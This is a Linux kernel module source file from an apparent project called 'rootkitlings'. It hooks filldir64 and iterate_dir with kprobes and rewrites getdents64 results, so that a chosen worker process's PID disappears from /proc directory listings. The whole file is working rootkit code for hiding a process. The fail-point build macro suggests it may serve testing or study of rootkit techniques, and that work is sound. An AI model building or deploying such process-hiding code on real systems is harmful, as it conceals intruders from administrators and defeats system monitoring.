// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/build_bug.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/magic.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/stddef.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "dirent_filter.h"
#include "rootkit.h"

#define RK_MISSING_ITERATE_TARGET \
	"__rootkitlings_missing_iterate_dir_target_7_2__"

/* Exact private layout used by Linux v7.2 fs/readdir.c. */
struct rk_getdents_callback64 {
	struct dir_context ctx;
	struct linux_dirent64 __user *current_dir;
	int prev_reclen;
	int error;
};

/* Pinned Linux v7.2 x86-64 ABI; fail the build instead of guessing. */
static_assert(sizeof(struct dir_context) == 24);
static_assert(offsetof(struct rk_getdents_callback64, ctx) == 0);
static_assert(offsetof(struct rk_getdents_callback64, current_dir) == 24);
static_assert(offsetof(struct rk_getdents_callback64, prev_reclen) == 32);
static_assert(offsetof(struct rk_getdents_callback64, error) == 36);
static_assert(sizeof(struct rk_getdents_callback64) == 40);

struct rk_getdents_instance {
	struct rk_getdents_callback64 *callback;
	struct linux_dirent64 __user *entries;
	void *scratch;
	size_t capacity;
	char target[RK_PID_TEXT_CAPACITY];
	size_t target_length;
};

static struct rk_state *probe_state;
static struct pid *target_pid;

static int rk_filldir_identity_pre(struct kprobe *probe,
				   struct pt_regs *registers)
{
	return 0;
}

static struct kprobe filldir_identity = {
	.symbol_name = "filldir64",
	.pre_handler = rk_filldir_identity_pre,
};

static filldir_t rk_filldir64_actor(void)
{
#ifdef CONFIG_X86_KERNEL_IBT
	/* x86 Kprobes moves function-entry probes past the four-byte ENDBR64. */
	return (filldir_t)((unsigned long)filldir_identity.addr - 4);
#else
	return (filldir_t)filldir_identity.addr;
#endif
}

static bool rk_file_is_proc_root(const struct file *file)
{
	const struct path *path;

	if (!file)
		return false;
	path = &file->f_path;
	return file_inode(file)->i_sb->s_magic == PROC_SUPER_MAGIC &&
	       path->dentry == path->dentry->d_sb->s_root;
}

static pid_t rk_target_number(const struct file *file)
{
	return pid_nr_ns(target_pid, proc_pid_ns(file_inode(file)->i_sb));
}

static int rk_iterate_entry(struct kretprobe_instance *instance,
			    struct pt_regs *registers)
{
	struct rk_getdents_instance *observation = (void *)instance->data;
	struct file *file;
	struct dir_context *context;
	struct rk_getdents_callback64 *callback;
	pid_t target_number;
	size_t capacity;

	observation->callback = NULL;
	observation->entries = NULL;
	observation->scratch = NULL;
	observation->capacity = 0;
	observation->target_length = 0;
	if (!rk_state_actions_enabled(probe_state))
		return 1;
	file = (struct file *)regs_get_kernel_argument(registers, 0);
	context = (struct dir_context *)regs_get_kernel_argument(registers, 1);
	if (!rk_file_is_proc_root(file) || !context ||
	    context->actor != rk_filldir64_actor())
		return 1;
	target_number = rk_target_number(file);
	if (target_number <= 0)
		return 1;
	observation->target_length = scnprintf(
		observation->target, sizeof(observation->target), "%d",
		target_number);
	capacity = context->count;
	if (capacity == 0 || capacity > RK_DIRECTORY_CHUNK_CAPACITY)
		return 1;
	callback = container_of(context, struct rk_getdents_callback64, ctx);
	if (!callback->current_dir)
		return 1;
	observation->scratch = kmalloc(capacity, GFP_ATOMIC);
	if (!observation->scratch)
		return 1;
	observation->callback = callback;
	observation->entries = callback->current_dir;
	observation->capacity = capacity;
	return 0;
}

static unsigned short rk_last_record_length(const void *buffer, size_t length)
{
	const unsigned char *bytes = buffer;
	size_t offset = 0;
	unsigned short record_length = 0;

	while (offset < length) {
		memcpy(&record_length,
		       bytes + offset +
		       offsetof(struct linux_dirent64, d_reclen),
		       sizeof(record_length));
		offset += record_length;
	}
	return record_length;
}

static bool rk_result_is_consistent(const struct rk_getdents_callback64 *callback,
				    const void *buffer, size_t capacity,
				    size_t produced)
{
	const unsigned char *bytes = buffer;
	unsigned short record_length;
	size_t previous_length;

	if (callback->ctx.count < 0 ||
	    (size_t)callback->ctx.count != capacity - produced ||
	    callback->prev_reclen <= 0)
		return false;
	previous_length = (size_t)callback->prev_reclen;
	if (previous_length > produced ||
	    previous_length < offsetof(struct linux_dirent64, d_name) + 1)
		return false;
	memcpy(&record_length,
	       bytes + produced - previous_length +
	       offsetof(struct linux_dirent64, d_reclen),
	       sizeof(record_length));
	return record_length == previous_length;
}

static int rk_iterate_return(struct kretprobe_instance *instance,
			     struct pt_regs *registers)
{
	struct rk_getdents_instance *observation = (void *)instance->data;
	struct rk_getdents_callback64 *callback = observation->callback;
	const unsigned long start = (unsigned long)observation->entries;
	const unsigned long end = (unsigned long)callback->current_dir;
	size_t produced;
	size_t output_length;
	size_t removed;
	unsigned short last_length;
	enum rk_dirent_filter_result filter_result;

	if ((long)regs_return_value(registers) < 0 || end < start)
		goto out;
	produced = end - start;
	if (produced == 0 || produced > observation->capacity)
		goto out;
	if (copy_from_user_nofault(observation->scratch, observation->entries,
				   produced))
		goto out;
	if (!rk_result_is_consistent(callback, observation->scratch,
				     observation->capacity, produced))
		goto out;
	filter_result = rk_filter_dirents64(observation->scratch, produced,
				    observation->target,
				    observation->target_length,
					    &output_length);
	if (filter_result != RK_DIRENT_FILTER_CHANGED)
		goto out;
	last_length = rk_last_record_length(observation->scratch, output_length);
	if (copy_to_user_nofault(observation->entries, observation->scratch,
				 output_length)) {
		callback->prev_reclen = 0;
		callback->error = -EFAULT;
		regs_set_return_value(registers, -EFAULT);
		goto out;
	}
	removed = produced - output_length;
	callback->current_dir = (void __user *)
		((unsigned long)observation->entries + output_length);
	callback->prev_reclen = last_length;
	callback->ctx.count += removed;
out:
	kfree(observation->scratch);
	observation->scratch = NULL;
	return 0;
}

static struct kretprobe iterate_probe = {
#if ROOTKITLINGS_FAIL_POINT == RK_FAIL_ITERATE_PROBE
	.kp.symbol_name = RK_MISSING_ITERATE_TARGET,
#else
	.kp.symbol_name = "iterate_dir",
#endif
	.entry_handler = rk_iterate_entry,
	.handler = rk_iterate_return,
	.data_size = sizeof(struct rk_getdents_instance),
	.maxactive = RK_DIRECTORY_RETURN_CAPACITY,
};

__must_check int rk_getdents_probe_start(struct rk_state *state)
{
	int error;

	if (probe_state || target_pid || !state)
		return -EINVAL;
	target_pid = rk_worker_get_tgid();
	if (!target_pid)
		return -ESRCH;
	probe_state = state;
	error = register_kprobe(&filldir_identity);
	if (error)
		goto clear_state;
	error = register_kretprobe(&iterate_probe);
	if (error)
		goto unregister_identity;
	return 0;

unregister_identity:
	unregister_kprobe(&filldir_identity);
clear_state:
	probe_state = NULL;
	put_pid(target_pid);
	target_pid = NULL;
	return error;
}

void rk_getdents_probe_stop(void)
{
	if (!probe_state)
		return;
	unregister_kretprobe(&iterate_probe);
	unregister_kprobe(&filldir_identity);
	probe_state = NULL;
	put_pid(target_pid);
	target_pid = NULL;
}

struct pid *rk_getdents_target_pid(void)
{
	return READ_ONCE(target_pid);
}

unsigned int rk_getdents_probe_missed(void)
{
	return (unsigned int)READ_ONCE(iterate_probe.nmissed);
}
